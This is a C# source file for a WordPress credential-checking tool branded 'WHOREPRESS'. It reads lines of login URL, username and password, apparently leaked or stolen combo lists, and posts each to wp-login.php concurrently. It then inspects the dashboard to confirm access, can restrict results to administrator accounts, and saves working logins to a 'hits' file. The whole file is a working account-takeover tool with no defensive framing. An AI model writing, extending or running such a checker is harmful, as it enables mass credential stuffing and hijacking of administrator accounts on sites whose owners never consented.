using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using CommandLine;
using Colorful;
using Console = Colorful.Console;
using System.Drawing;
using Banner = WHOREPRESS.Banner;

public class Program
{
    static async Task Main(string[] args)
    {
        Banner.Show();

        var result = Parser.Default.ParseArguments<Options>(args)
            .WithParsed(async o =>
            {
                string filename = o.Filename;
                bool adminOnly = o.AdminOnly;
                string outputFile = o.Output;
                bool debugMode = o.Debug;
                int concurrency = o.Concurrency;

                var wpChecker = new WordpressChecker(concurrency, adminOnly, outputFile, debugMode);
   
                await wpChecker.ReadAccountsAsync(filename);
            });

     
    }
}

public class Options
{
    [Option('a', "admin-only", Required = false, HelpText = "Check only admin users.")]
    public bool AdminOnly { get; set; }

    [Option('o', "output", Required = false, HelpText = "Output file for results", Default = "hits.txt")]
    public string Output { get; set; }

    [Option('d', "debug", Required = false, HelpText = "Enable debug mode.")]
    public bool Debug { get; set; }

    [Option('c', "concurrency", Required = false, HelpText = "Number of concurrent requests", Default = 5)]
    public int Concurrency { get; set; }

    [Value(0, MetaName = "filename", HelpText = "Input filename", Required = true)]
    public string Filename { get; set; }
}

public class WordpressChecker
{
    private readonly int concurrency;
    private readonly bool adminOnly;
    private readonly string outputFile;
    private readonly bool debugMode;
    private readonly HttpClient httpClient;
    private readonly SemaphoreSlim semaphore;

    public WordpressChecker(int concurrency, bool adminOnly, string outputFile, bool debugMode)
    {
        this.concurrency = concurrency;
        this.adminOnly = adminOnly;
        this.outputFile = outputFile;
        this.debugMode = debugMode;
        this.semaphore = new SemaphoreSlim(concurrency);
        this.httpClient = new HttpClient(new HttpClientHandler { CookieContainer = new CookieContainer() });
    }

  

    public async Task ReadAccountsAsync(string filename)
    {
        using (var reader = new StreamReader(filename))
        {
            string line;
            while ((line = await reader.ReadLineAsync()) != null)
            {
                var match = Regex.Match(line, @"(https?://[^\s/]+/(?:wp-login\.php|wp-admin|user-new\.php))\s*:\s*([^\s:]+)\s*:\s*([^\s:]+)");
                if (match.Success)
                {
                    await semaphore.WaitAsync();
                    var url = match.Groups[1].Value;
                    var username = match.Groups[2].Value;
                    var password = match.Groups[3].Value;
                    _ = CheckAccountAsync(url, username, password).ContinueWith(t => semaphore.Release());
                }
            }
        }

        Console.WriteLine("Finished reading accounts", Color.Green);
    }

    private async Task CheckAccountAsync(string url, string username, string password)
    {
        try
        {
            var payload = new FormUrlEncodedContent(new[]
            {
                new KeyValuePair<string, string>("log", username),
                new KeyValuePair<string, string>("pwd", password),
                new KeyValuePair<string, string>("wp-submit", "Log In"),
                new KeyValuePair<string, string>("redirect_to", url.Replace("wp-login.php", "wp-admin/")),
                new KeyValuePair<string, string>("testcookie", "1")
            });

            var response = await httpClient.PostAsync(url, payload);

            if (response.Headers.Contains("set-cookie"))
            {
                var cookies = response.Headers.GetValues("set-cookie");
                var cookieHeader = string.Join("; ", cookies);
                httpClient.DefaultRequestHeaders.Add("Cookie", cookieHeader);

                var dashboardUrl = url.Replace("wp-login.php", "wp-admin/");
                var dashboardResponse = await httpClient.GetAsync(dashboardUrl);
                var responseBody = await dashboardResponse.Content.ReadAsStringAsync();

                bool isAdmin = true;
                if (adminOnly)
                {
                    isAdmin = responseBody.Contains("plugin-install.php");
                }

                if (isAdmin && (responseBody.Contains("dashicons-admin-plugins") || responseBody.Contains("wp-admin-bar")))
                {
                    await File.AppendAllTextAsync(outputFile, $"{url} - {username}|{password}\n");
                    Console.WriteLine($"[+] HIT | {url} | {username} | {password}", Color.Green);
                }
                else
                {
                    Console.WriteLine($"[-] BAD | {url} | {username} | {password}", Color.Red);
                }
            }
            else
            {
                Console.WriteLine($"[-] BAD | {url} | {username} | {password}", Color.Red);
            }
        }
        catch (Exception ex)
        {
            if (debugMode)
            {
                Console.WriteLine($"Error checking account {username}@{url}: {ex}", Color.Yellow);
            }
            Console.WriteLine($"[-] BAD | {url} | {username} | {password}", Color.Red);
        }
    }
}
